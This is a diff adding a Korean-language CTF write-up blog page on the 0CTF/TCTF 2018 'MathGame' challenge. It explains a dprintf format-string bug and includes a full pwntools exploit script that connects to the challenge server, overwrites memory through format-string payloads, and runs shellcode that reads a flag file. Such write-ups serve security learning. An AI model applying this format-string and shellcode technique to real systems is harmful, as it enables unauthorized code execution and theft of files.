@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>0CTF/TCTF 2018 Quals - MathGame | KiraSys</title>
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>KiraSys</div>
+        
+            <div>CAT-Security</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/kirasys">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+            
+                <a href="https://www.facebook.com/profile.php?id=100008635065103">
+                    <img src="/assets/facebook.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>0CTF/TCTF 2018 Quals - MathGame</h1>
+    </header>
+
+    <section>
+      <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v3; <span class="comment">// [esp+22014h] [ebp-18h]</span></span><br><span class="line"><span class="keyword">int</span> v4; <span class="comment">// [esp+22018h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">MEMORY[<span class="number">0xDEAD1000</span>] = random_value();</span><br><span class="line">v4 = MEMORY[<span class="number">0xDEAD1000</span>];</span><br><span class="line">MEMORY[<span class="number">0xDEAD1004</span>] = random_value();</span><br><span class="line">v3 = MEMORY[<span class="number">0xDEAD1004</span>];</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, (<span class="keyword">void</span> *)<span class="number">0xDEAD1008</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0xDEAD1008</span>] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  dprintf(<span class="number">0x565FDFA0</span>, <span class="number">4</span>, <span class="number">0xDEAD1008</span>);</span><br><span class="line">&#125;</span><br><span class="line">result = MEMORY[<span class="number">0xDEAD1800</span>];</span><br><span class="line"><span class="keyword">if</span> ( MEMORY[<span class="number">0xDEAD1800</span>] == v4 - v3 )</span><br><span class="line">&#123;</span><br><span class="line">  s = mmap(<span class="number">0</span>, <span class="number">0x1000</span>u, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !s )</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( buf = s; (<span class="keyword">char</span> *)buf - (_BYTE *)s &lt;= <span class="number">95</span>; ++buf )</span><br><span class="line">  &#123;</span><br><span class="line">    read(MEMORY[<span class="number">0xDEAD1800</span>] - (v4 - v3), buf, <span class="number">4u</span>);</span><br><span class="line">    *buf ^= MEMORY[<span class="number">0xDEAD1800</span>] - (v4 - v3);</span><br><span class="line">  &#125;</span><br><span class="line">  result = ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))s)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>dprintf 함수에서 format string bug가 존재하지만, 출력 결과를 /dev/null (4)로 보내서 leak을 이용할 수 없었다. 0xDEAD1800에 v4-v3 값을 넣을 수 있다면 shellcode를 실행시킬 수 있다. 그리고 dprintf 호출 전에 esp를 0xDEAD1000로 바꾸고 호출이 끝나면, 다시 esp를 복구하는 어셈 코드가 박혀있다. <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mmap((<span class="keyword">void</span> *)<span class="number">0xDEAB0000</span>, <span class="number">0x22000</span>u, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>) != (<span class="keyword">void</span> *)<span class="number">-559218688</span> )</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
+<p>dprintf의 return 주소를 변경하여 shellcode를 입력받는 부분으로 강제로 이동하려 해도, 0xDEAB0000에서부터 0x22000 크기만큼 할당받아 사용하고 있어서 v3,v4 값을 불러올 때 memory access violation이 된다. 그래서 0xDEAD1000과 0xDEAD1004에 저장된 랜덤 값을 leak하여서 분기문을 우회하기로 하였다.<br><br><br></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>dprintf 함수의 2번째 인자에 전달하는 값이 파일 디스크립터 넘버이므로, 이 값을 1로 바꾸면 dprintf의 출력 결과를 볼 수 있다. 따라서 format string bug를 통해 인자로 전달된 4를 1로 바꾸고 dprintf의 리턴 주소를 dprintf를 호출하는 곳으로 돌리면 원하는 곳을 leak할 수 있다. 그런데 무한 루프에 빠지게 되므로 4를 1로 바꾸고 리턴 주소를 조작하는 동시에, format string도 같이 변경해주어야 한다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//A, a, B, b, C, c 는 적절한 상수를 의미한다.</span><br><span class="line">p32(fd_ptr) + p32(ret_ptr) + p32(format_ptr + offset) + %Ac%a$n + %Bc%b$n + %Cc%c$n</span><br></pre></td></tr></table></figure></p>
+<p>좀 더 구체적으로 설명하면, dprintf에서 사용하는 format은 대충 저런 형식이며 fd_ptr은 2번째 인자로 전달된 4가 저장된 곳, ret_ptr은 dprintf의 리턴 주소가 저장된 곳을 가리키고 있고 (format_ptr + offset)은 세번째 인자로 주어지는 format string에서 B를 가리키고 있다. 이제 실행 흐름이 어떻게 바뀌는지 알아보자. <br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dprintf(0x565FDFA0, 4, p32(fd_ptr) + p32(ret_ptr) + p32(format_ptr + offset) + %Ac%a$n + %Bc%b$n + %Cc%c$n)</span><br><span class="line">-&gt; return while loop</span><br><span class="line"></span><br><span class="line">dprintf(0x565FDFA0, 1, p32(fd_ptr) + p32(ret_ptr) + p32(format_ptr + offset) + %Ac%a$n + %Dc%b$n + %Cc%c$n)</span><br><span class="line">-&gt; return dprintf (infinite loop)</span><br><span class="line"></span><br><span class="line">dprintf(0x565FDFA0, 1, p32(fd_ptr) + p32(ret_ptr) + p32(format_ptr + offset) + %Ac%a$n + %Dc%b$n + %Cc%c$n)</span><br><span class="line">-&gt; return while loop</span><br></pre></td></tr></table></figure></p>
+<p>처음 %Ac%a$n이 실행되면 fd를 1로 변경, %Bc%b$n이 실행되면 리턴 주소를 dprintf로 변경하여 인자 push 과정을 생략한 dprintf의 호출 주소로 이동하기 때문에 leak이 발생한다. 마지막으로 %Cc%c$n는 B를 D로 바꾸기 때문에 다시 한번 dprintf가 실행되면서 dprintf 리턴 주소를 무한 루프에서 빠져나가게 변경한다. 이제 무한 루프를 벗어나는 방법을 알았으니, 0xDEAD1000과 0xDEAD1004를 leak하고 두 값을 뺀 값을 0xDEAD1800에 넣어주면 된다.<br><br><br></p>
+<h3 id="Exploit-py"><a href="#Exploit-py" class="headerlink" title="Exploit.py"></a>Exploit.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment">#s = process('subtractiono')</span></span><br><span class="line">s = remote(<span class="string">'202.120.7.218'</span>,<span class="number">12321</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0xDEAD0FEC</span></span><br><span class="line">fd_ptr = <span class="number">0xDEAD0FF0</span></span><br><span class="line">fmt_data = <span class="number">0xDEAD1008</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data</span><span class="params">(p,data)</span>:</span> <span class="comment"># 2byte write</span></span><br><span class="line">    payload = p32(p)+<span class="string">'%'</span>+str(u16(data) - <span class="number">4</span>)+<span class="string">'c'</span>+<span class="string">"%5$hn"</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) &gt; <span class="number">0x20</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error!!"</span></span><br><span class="line">    s.send(payload.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">number_ptr = <span class="number">0xdead1042</span></span><br><span class="line">fmt  = p32(fd_ptr) + p32(ret) + p32(number_ptr)+<span class="string">'%'</span>+str(<span class="number">0x101</span><span class="number">-12</span><span class="number">-0x2a</span>)+<span class="string">'c'</span>+<span class="string">"%13$hhn"</span></span><br><span class="line">fmt += <span class="string">'%'</span>+str(<span class="number">160</span><span class="number">-1</span>)+<span class="string">'c'</span> + <span class="string">"%14$hhn"</span> + <span class="string">'%'</span>+str(<span class="number">0x3436</span> - <span class="number">0x1a0</span>)+<span class="string">'c'</span> + <span class="string">'%15$hnaaaaa'</span></span><br><span class="line"><span class="keyword">assert</span> len(fmt)%<span class="number">2</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(fmt),<span class="number">2</span>):</span><br><span class="line">    write_data(fmt_data+i, fmt[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'%4c%4c%08x%08x'</span>.ljust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">s.recvn(<span class="number">8</span>)</span><br><span class="line">rand1 = int(s.recvn(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">rand2 = int(s.recvn(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(rand1)</span><br><span class="line"><span class="keyword">print</span> hex(rand2)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> (rand1 - rand2) &gt; <span class="number">0</span></span><br><span class="line">r = rand1 - rand2</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0xdead17ff</span>,<span class="string">'a'</span>+chr(r&amp;<span class="number">0xff</span>))</span><br><span class="line">write_data(<span class="number">0xdead17ff</span>+<span class="number">2</span>,chr((r&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>) +<span class="string">'a'</span>)</span><br><span class="line">write_data(<span class="number">0xdead17ff</span>+<span class="number">3</span>,chr((r&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>) +<span class="string">'a'</span>)</span><br><span class="line">write_data(<span class="number">0xdead17ff</span>+<span class="number">4</span>,chr((r&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>) +<span class="string">'a'</span>)</span><br><span class="line">s.send(<span class="string">'\x00'</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.pushstr(<span class="string">'/home/subtraction/flag'</span>)</span><br><span class="line">shellcode += shellcraft.open(<span class="string">'esp'</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>, <span class="string">'esp'</span>, <span class="number">0x500</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'esp'</span>, <span class="number">0x500</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">pad = (len(shellcode)%<span class="number">4</span>)*<span class="string">'\x90'</span></span><br><span class="line">shellcode = pad + shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode),<span class="number">4</span>):</span><br><span class="line">    s.send(shellcode[i:i+<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>-(len(shellcode)/<span class="number">4</span>)):</span><br><span class="line">    s.send(<span class="string">'\x90'</span>*<span class="number">4</span>)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+<p>format string의 길이가 0x20을 넘어가므로, %n을 통해 format string 인자를 구성해주었다.</p>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2018-04-09T05:20:04.000Z" itemprop="datePublished">
+              2018-04-09
+            </time>
+          </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2016 - kirasys </div>
+    <div>
+    Powered by Hexo
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
